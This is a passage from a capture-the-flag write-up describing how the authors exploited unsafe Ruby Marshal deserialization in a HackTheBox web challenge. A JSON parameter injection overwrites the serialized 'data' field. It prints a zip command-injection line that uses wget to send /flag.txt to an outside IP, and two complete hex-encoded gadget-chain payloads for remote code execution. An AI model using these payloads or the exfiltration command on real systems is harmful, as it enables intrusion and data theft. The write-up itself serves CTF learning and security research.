+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>auth(<span style="color:#e6db74">&#34;Token </span><span style="color:#e6db74">#{</span>session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://localhost:8080/api/contract_templates/</span><span style="color:#e6db74">#{</span>params<span style="color:#f92672">[</span><span style="color:#e6db74">:id</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status<span style="color:#f92672">.</span>success?
+</span></span><span style="display:flex;"><span>      @template <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>parse
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      puts @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">].</span>unpack(<span style="color:#e6db74">&#34;H*&#34;</span>)
+</span></span><span style="display:flex;"><span>      content <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>load(@template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span>) <span style="color:#66d9ef">if</span> @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">||=</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:id</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>      @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;name&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">||=</span> <span style="color:#e6db74">&#39;Unnamed Template&#39;</span>
+</span></span><span style="display:flex;"><span>      @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;description&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">||=</span> <span style="color:#e6db74">&#39;No description provided.&#39;</span>
+</span></span><span style="display:flex;"><span>      @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> content
+</span></span><span style="display:flex;"><span>      @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;created_at&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">||=</span> <span style="color:#66d9ef">Time</span><span style="color:#f92672">.</span>current<span style="color:#f92672">.</span>to_s
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      redirect_to contract_templates_path, <span style="color:#e6db74">alert</span>: <span style="color:#e6db74">&#34;Template not found.&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><h4 id="edit">Edit:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>
+</span></span><span style="display:flex;"><span>  response <span style="color:#f92672">=</span> <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>auth(<span style="color:#e6db74">&#34;Token </span><span style="color:#e6db74">#{</span>session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://localhost:8080/api/contract_templates/</span><span style="color:#e6db74">#{</span>params<span style="color:#f92672">[</span><span style="color:#e6db74">:id</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status<span style="color:#f92672">.</span>success?
+</span></span><span style="display:flex;"><span>    @contract_template <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>parse
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    @contract_template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">||=</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:id</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    @contract_template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;name&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">||=</span> <span style="color:#e6db74">&#39;Unnamed Template&#39;</span>
+</span></span><span style="display:flex;"><span>    @contract_template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;description&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">||=</span> <span style="color:#e6db74">&#39;No description provided.&#39;</span>
+</span></span><span style="display:flex;"><span>    @contract_template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>load(@contract_template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span>) <span style="color:#66d9ef">if</span> @contract_template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    flash<span style="color:#f92672">[</span><span style="color:#e6db74">:alert</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to load template for editing.&#34;</span>
+</span></span><span style="display:flex;"><span>    redirect_to contract_templates_path
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><h4 id="update">Update:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update</span>
+</span></span><span style="display:flex;"><span>  serialized_content <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(params<span style="color:#f92672">[</span><span style="color:#e6db74">:content</span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  user_id <span style="color:#f92672">=</span> session<span style="color:#f92672">[</span><span style="color:#e6db74">:user_id</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  response <span style="color:#f92672">=</span> <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>auth(<span style="color:#e6db74">&#34;Token </span><span style="color:#e6db74">#{</span>session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>patch(<span style="color:#e6db74">&#34;http://localhost:8080/api/contract_templates/</span><span style="color:#e6db74">#{</span>params<span style="color:#f92672">[</span><span style="color:#e6db74">:id</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">json</span>: {
+</span></span><span style="display:flex;"><span>                          name: params<span style="color:#f92672">[</span><span style="color:#e6db74">:name</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>                          <span style="color:#e6db74">description</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:description</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>                          <span style="color:#e6db74">data</span>: serialized_content,
+</span></span><span style="display:flex;"><span>                          <span style="color:#e6db74">user_id</span>: user_id <span style="color:#75715e"># Pass user_id from session</span>
+</span></span><span style="display:flex;"><span>                        })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status<span style="color:#f92672">.</span>success?
+</span></span><span style="display:flex;"><span>    flash<span style="color:#f92672">[</span><span style="color:#e6db74">:notice</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Template updated successfully.&#34;</span>
+</span></span><span style="display:flex;"><span>    redirect_to contract_templates_path
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    flash<span style="color:#f92672">.</span>now<span style="color:#f92672">[</span><span style="color:#e6db74">:alert</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to update template.&#34;</span>
+</span></span><span style="display:flex;"><span>    render <span style="color:#e6db74">:edit</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>Don&rsquo;t you see anything suspicious? <strong>Administrator</strong> is the highest privilege, so a command execution must surely exist in the above code.
+The code uses the <strong>Marshal</strong> library to serialize <em>(Marshal.dump)</em> and <code>deserialize</code> <em>(Marshal.load)</em> the template content.<br>
+It is known that arbitrary deserialization can be linked to code execution. Let&rsquo;s see how we can exploit this code:</p>
+<p>Deserialization takes place in the <code>show</code> function, i.e. when a template is accessed: <em>/contract_templates/<!-- raw HTML omitted --></em>
+The content is retrieved from the api and deserialized.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>content <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>load(@template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span>) <span style="color:#66d9ef">if</span> @template<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Let&rsquo;s see how the content is saved:</p>
+<p>In both the <strong>update</strong> and <strong>create</strong> functions, the content is first serialized, meaning that the object corresponds to a string.
+The HTTP protocol only allows us to send arrays or text, not the Ruby objects required for deserialization. We need to find a way to set <code>template.content</code> to the ones we want, <strong>bypassing marshal.load</strong>.</p>
+<p>The way the template is created on the backend is <code>vulnerable to JSON injection</code> !
+The template content is serialized and then passed to a dictionary with the key <code>data</code>. The <code>user_id</code> field is added, then this dictionary is merged with <code>params.to_unsafe_h</code>, which corresponds to all the parameters passed to the Ruby application <em>(POST)</em>.</p>
+<p>Here is the vulnerable part:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#66d9ef">SNIPPED</span><span style="color:#f92672">]</span> <span style="color:#f92672">...</span> <span style="color:#e6db74">json</span>: { <span style="color:#e6db74">data</span>: serialized_content, <span style="color:#e6db74">user_id</span>: user_data<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>merge(params<span style="color:#f92672">.</span>to_unsafe_h))
+</span></span></code></pre></div><p>The JSON specification means that if a key is present twice in a dictionary, the value retained is the last one. This makes it possible to overwrite the data field with our malicious serialized content.</p>
+<p>You can check this behavior in python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Python <span style="color:#ae81ff">3.12.3</span> (main, Nov  <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">2024</span>, <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">32</span>:<span style="color:#ae81ff">19</span>) [GCC <span style="color:#ae81ff">13.2.0</span>] on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> json<span style="color:#f92672">.</span>loads(<span style="color:#e6db74">&#39;{&#34;data&#34;: &#34;value1&#34;, &#34;data&#34;: &#34;value2&#34;}&#39;</span>)
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;data&#39;</span>: <span style="color:#e6db74">&#39;value2&#39;</span>}
+</span></span></code></pre></div><p>A template can be created by adding a <code>data</code> parameter with an arbitrary value:<br>
+<img src="./img/image-22.png" alt="template creation"></p>
+<p>When accessing the template, an error is raised because our serialized value <em>(&ldquo;AAA&hellip;A&rdquo;)</em> is not a valid serialized string.<br>
+<img src="./img/image-23.png" alt="error in marshal.load"></p>
+<p>The final stage of the challenge will be to find a deserialization gadget for this version of Ruby.
+The ruby version can be found quickly via docker:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/backend <span style="color:#75715e"># ruby --version</span>
+</span></span><span style="display:flex;"><span>ruby 3.4.0preview2 <span style="color:#f92672">(</span>2024-10-07 master 32c733f57b<span style="color:#f92672">)</span> +PRISM <span style="color:#f92672">[</span>x86_64-linux-musl<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/backend <span style="color:#75715e"># </span>
+</span></span></code></pre></div><p>In November, <a href="https://x.com/lukejahnke" target="_blank">Luke Jahnke</a> published <a href="https://nastystereo.com/security/ruby-3.4-deserialization.html" target="_blank">an article</a> on Ruby3.4 entitled <strong>Universal RCE Deserialization Gadget Chain</strong> &hellip; Sounds good</p>
+<p>To put it simply, it uses previous research by <a href="https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1" target="_blank">Leonardo Giovannini</a> and <a href="https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/" target="_blank">Peter Stöckli</a> to run code on the latest version of Ruby.</p>
+<p>Deserialization abuses a gadget in <code>net/http</code> to make a request and create a folder with a valid git tree. Calling a <code>git</code> gadget allows us to make a <code>Popen</code> in Ruby with the binary of our choice, an argument to <code>rev-parse</code> and a 2nd controlled argument.
+Binaries such as <code>zip</code>, <code>rake</code> or <code>make</code> can be used for code execution via command injection in the 2nd parameter.</p>
+<p><a href="https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/" target="_blank">Peter Stöckli&rsquo;s article</a> is very well written and provides an in-depth understanding of the deserialization chain.</p>
+<p>A similar POC is also available <a href="https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb" target="_blank">here</a>.</p>
+<p>Having set up a shared folder between my host and /home/poc in the docker allows me to generate the malicious serialized string in the docker so that all variables/constants/versions are correct.</p>
+<p>We were delighted to finish the challenge, but unfortunately the rce wasn&rsquo;t working!
+After spending <strong>several hours</strong> debugging in Ruby, we decided to check the commits on the Docker image used: <code>ruby:3.4-rc-alpine3.20</code></p>
+<p>Here&rsquo;s what we found: <a href="https://github.com/docker-library/ruby/commit/34da3c21b6eb8a63f2c72167f3ad46fe31260dc3" target="_blank">https://github.com/docker-library/ruby/commit/34da3c21b6eb8a63f2c72167f3ad46fe31260dc3</a></p>
+<p>It seems that the image <code>was patched on the day of the CTF</code> and is no longer vulnerable! However, HackTheBox&rsquo;s servers must have built the docker image before the patch and were therefore unaffected. We rebuilt our local docker with the <code>ruby:3.4-rc-alpine3.19</code> version and regenerated the two serialized strings.</p>
+<p>To exfiltrate the flag, here&rsquo;s the injection command used in the <code>Zip</code> binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip_param_to_execute <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-TmTT=\&#34;</span><span style="color:#66d9ef">$(</span>wget http://192.168.1.5:3333/<span style="color:#e6db74">`</span>cat /flag.txt<span style="color:#e6db74">`</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">\&#34;any.zip&#34;</span>
+</span></span></code></pre></div><p>The flag is recovered locally:<br>
+<img src="./img/image-24.png" alt="flag"></p>
+<p>And in remote too: <code>HTB{3nc0d1ng_15_1mp0rt4nt_r1gh7!_e5960fd6b925738540f0ddfc94052eea}</code> !</p>
+<p>Here are the two hexadecimal gadgets used to flag the HTB instance:</p>
+<pre tabindex="0"><code>04085b07631547656d3a3a5370656346657463686572553a1147656d3a3a56657273696f6e5b066f3a1e47656d3a3a526571756573745365743a3a4c6f636b66696c650a3a09407365746f3a1447656d3a3a52657175657374536574063a1540736f727465645f72657175657374735b076f3a2547656d3a3a5265736f6c7665723a3a5370656353706563696669636174696f6e063a0a40737065636f3a2447656d3a3a5265736f6c7665723a3a47697453706563696669636174696f6e073a0c40736f757263656f3a1547656d3a3a536f757263653a3a4769740a3a09406769744922087a6970063a0645543a0f407265666572656e63654922102f6574632f706173737764063b10543a0e40726f6f745f6469724922092f746d70063b10543a10407265706f7369746f7279492208616e79063b10543a0a406e616d65492208616e79063b10543b0b6f3a2147656d3a3a5265736f6c7665723a3a53706563696669636174696f6e073b14492208616e79063b10543a1240646570656e64656e636965735b006f3b0a063b0b6f3b0c073b0d6f3b0e0a3b0f4922087a6970063b10543b114922462d546d54543d2224287767657420687474703a2f2f3139342e3136312e3135372e37373a333333332f60636174202f666c61672e747874602922616e792e7a6970063b10543b124922092f746d70063b10543b13492208616e79063b10543b14492208616e79063b10543b0b6f3b15073b14492208616e79063b10543b165b003b165b003a134067656d5f646570735f66696c654922092f746d70063b10543a124067656d5f646570735f6469724922062f063b10543a0f40706c6174666f726d735b00
+
+04085b07631547656d3a3a5370656346657463686572553a1147656d3a3a56657273696f6e5b066f3a1e47656d3a3a526571756573745365743a3a4c6f636b66696c650a3a09407365746f3a1447656d3a3a52657175657374536574063a1540736f727465645f72657175657374735b066f3a2647656d3a3a5265736f6c7665723a3a496e64657853706563696669636174696f6e073a0a406e616d654922096e616d65063a0645543a0c40736f757263656f3a1047656d3a3a536f75726365073a09407572696f3a0e5552493a3a485454500b3a0a40706174684922062f063b0c543a0c40736368656d654922077333063b0c543a0a40686f737449223e7275627967656d732e6f72672f717569636b2f4d61727368616c2e342e382f62756e646c65722d322e322e32372e67656d737065632e727a3f063b0c543a0a40706f72744922762f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f746d702f63616368652f62756e646c65722f6769742f616e792d633566653032303064316337613531333962643138666432323236386334636138626634356539302f063b0c543a0a4075736572492208616e79063b0c543a0e4070617373776f7264492208616e79063b0c543a12407570646174655f6361636865543a1240646570656e64656e636965735b003a134067656d5f646570735f66696c654922092f746d70063b0c543a124067656d5f646570735f6469724922062f063b0c543a0f40706c6174666f726d735b00
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>Finally, we (<a href="https://esna.bzh/" target="_blank">ESNA</a>) are the first to have flagged this challenge and we finished second in the competition just a few dozen minutes behind the leaders (for the third edition in a row).</p>
+<p>The challenge was very rewarding, as it involved recent exploitation techniques that deserve to be given visibility. Congratulations to the challenge&rsquo;s creator(s), we had a lot of fun!</p>
+<p><img src="./img/image-25.png" alt="podium"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/pong-fcsc2024-en/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Pong [EN]| FCSC 2024</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#files--setup">Files &amp; Setup</a></li>
+    <li><a href="#first-analysis--overview">First analysis &amp; overview</a></li>
+    <li><a href="#analysis-of-the-frontend-and-various-user-routes">Analysis of the frontend and various user routes.</a></li>
+    <li><a href="#first-vulnerability">First vulnerability</a></li>
+    <li><a href="#second-vulnerability">Second vulnerability</a>
+      <ul>
+        <li></li>
+        <li><a href="#portswigger-to-the-rescue">PortSwigger to the rescue</a></li>
+      </ul>
+    </li>
+    <li><a href="#third-vulnerability">Third vulnerability</a></li>
+    <li><a href="#fourth-vulnerability">Fourth vulnerability</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
